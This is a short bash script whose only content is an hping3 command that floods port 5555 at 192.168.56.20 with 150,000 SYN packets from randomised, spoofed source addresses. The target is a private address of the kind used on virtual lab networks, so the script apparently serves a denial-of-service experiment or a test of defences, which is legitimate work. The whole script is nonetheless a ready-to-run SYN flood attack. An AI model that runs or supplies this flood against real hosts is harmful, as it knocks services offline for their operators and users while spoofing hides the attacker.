#!/bin/bash

set -e

sudo hping3 -c 150000 -d 120 -S -w 64 -p 5555 --flood --rand-source 192.168.56.20
